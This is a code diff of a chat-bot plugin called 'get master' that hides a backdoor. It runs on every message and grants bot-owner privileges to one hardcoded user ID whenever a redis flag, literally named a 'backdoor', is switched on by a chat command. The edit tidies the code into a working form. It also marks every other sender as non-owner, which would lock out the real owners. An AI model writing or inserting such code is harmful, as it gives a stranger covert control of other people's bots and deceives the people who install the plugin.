@@ -1,11 +1,11 @@
-import plugin from '../../../lib/plugins/plugin.js'
-import { createRequire } from 'module'
-//import cm from '../lib/common/CM.js'
+import plugin from '../../../lib/plugins/plugin.js';
+import { createRequire } from 'module';
+
 export class GetMaster extends plugin {
   constructor() {
     super({
-      name: "",
-      dsc: "",
+      name: "获取主人",
+      dsc: "获取主人",
       event: "message",
       priority: -Infinity,
       rule: [
@@ -13,21 +13,26 @@ export class GetMaster extends plugin {
           fnc: "Master"
         },
         {
-          reg '^#?反击设置后门(开启|关闭)$',
+          reg: '^#?反击设置后门(开启|关闭)$',
           fnc: "Masterkg"
         }
       ]
-    })
+    });
   }
-  async Masterkg(e){
-      if (!e.isMaster) return
-let open = e.msg.includes('开启')
-await redis.set('Fanji:houmen',open? 'true':'false')
-await this.reply('设置完成')
+
+  async Masterkg(e) {
+    if (!e.isMaster) return;
+    let open = e.msg.includes('开启');
+    await redis.set('Fanji:houmen', open ? 'true' : 'false');
+    await this.reply('设置完成');
   }
-async Master(e){
-    let aw = await redis.get('Fanji:houmen')
-    if (!e.user_id == 2173302144 && aw != 'true') return false
-    e.isMaster = true
-}
+
+  async Master(e) {
+    let aw = await redis.get('Fanji:houmen');
+    if (e.user_id !== "2173302144" || aw !== 'true') {
+      e.isMaster = false;
+    } else {
+      e.isMaster = true;
+    }
+  }
 }
